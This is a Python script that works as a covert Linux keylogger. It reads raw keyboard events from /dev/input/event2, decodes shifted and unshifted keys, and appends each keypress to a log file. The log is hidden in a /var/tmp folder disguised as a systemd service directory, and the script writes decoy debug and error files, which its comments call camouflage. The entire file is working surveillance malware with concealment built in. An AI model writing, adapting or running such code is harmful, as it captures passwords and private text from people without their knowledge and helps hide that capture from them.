import struct
import os

# GLOBAL KEY MAP
key_mapping = {
    # Lowercase and Digits
    30: 'a',  48: 'b',  46: 'c',  32: 'd',  18: 'e', 
    33: 'f',  34: 'g',  35: 'h',  23: 'i',  36: 'j', 
    37: 'k',  38: 'l',  50: 'm',  49: 'n',  24: 'o', 
    25: 'p',  16: 'q',  19: 'r',  31: 's',  20: 't', 
    22: 'u',  47: 'v',  17: 'w',  45: 'x',  21: 'y', 
    44: 'z',  57: 'space',  28: 'enter',  14: 'backspace',
    2: '1', 3: '2', 4: '3', 5: '4', 6: '5', 7: '6', 9: '7',
    10: '8', 11: '9', 12: '0',
    # Shift and Ctrl Modifier
    42: 'SHIFT',
    29: 'CTRL',
    # Uppercase key mappings (Shift + Lowercase/Digit)
    30 + 64: 'A',  48 + 64: 'B',  46 + 64: 'C',  32 + 64: 'D',  18 + 64: 'E',
    33 + 64: 'F',  34 + 64: 'G',  35 + 64: 'H',  23 + 64: 'I',  36 + 64: 'J',
    37 + 64: 'K',  38 + 64: 'L',  50 + 64: 'M',  49 + 64: 'N',  24 + 64: 'O',
    25 + 64: 'P',  16 + 64: 'Q',  19 + 64: 'R',  31 + 64: 'S',  20 + 64: 'T',
    22 + 64: 'U',  47 + 64: 'V',  17 + 64: 'W',  45 + 64: 'X',  21 + 64: 'Y',
    44 + 64: 'Z', 2 + 64: '!', 3 + 64: '@', 4 + 64: '#', 5 + 64: '$', 6 + 64: '%', 7 + 64: '^', 9 + 64: '&', 10 + 64: '*', 11 + 64: '(', 12 + 64: ')'
}

# Specify log file directory (/var/tmp persists after reboot)
# Note: Might need to scan for other folders ID b/c it changes on reboot
logDirectory = "/var/tmp/systemd-private-c36ab02a889e43a48b4f62f7036ca080-TextWrapper.service-Ud8j9l"

# Create folder that attempts to blend in
os.makedirs(logDirectory, exist_ok = True)

# Fill directory with extra files with random data for extra camoflague
with open(logDirectory+"/debug-info.txt", 'w') as file:
    file.write("[DEBUG] 2024-09-24 10:15:42 - Initializing application...\n")

with open(logDirectory+"/error.log", 'w') as file:
    file.write('\n'*12)

# Set keyboard to read from
inputDevice = '/dev/input/event2'

# Declare variables for logger
shiftPressed = False
key_char = None

# Open read access to input device
with open(inputDevice, 'rb') as keyboard:
    while True:
        # Read keystroke from keyboard
        keystroke = keyboard.read(24)

        # If keystroke sent then break down into timing, event type, value, and key code
        if keystroke:
            (tv_sec, tv_usec, ev_type, code, value) = struct.unpack('llHHI', keystroke)

            '''
            ev_type == Event Type
                ev_type of 1 is key stroke which is what we are looking for

            value == Press or Release key
                value of 1 is key is press down

            code == Key pressed
                value of 30 is lowercase a
            '''
            # If keystroke and key is pressed down
            if ev_type == 1 and value == 1:
                # Have to check if Shift is pressed so that uppercase and punctuation are logged
                if code == 42:
                    shiftPressed = True
                    key_char = key_mapping[code]
                # If key code can be mapped to a char
                elif code in key_mapping:
                        # If shift pressed down, use uppercase/punctuation
                        if shiftPressed and (code in key_mapping):
                            key_char = key_mapping[code+64]
                        # Otherwise use lowercase/numbers
                        else:
                            key_char = key_mapping[code]

                # Log key to file located in logDirectory
                with open(logDirectory + '/keyLogger.log', 'a') as logFile:
                    logFile.write(f'Key {key_char}\n')

            # If shift is released, set shiftPressed to False
            elif ev_type == 1 and value == 0:
                if code == 42:
                    shiftPressed = False
            

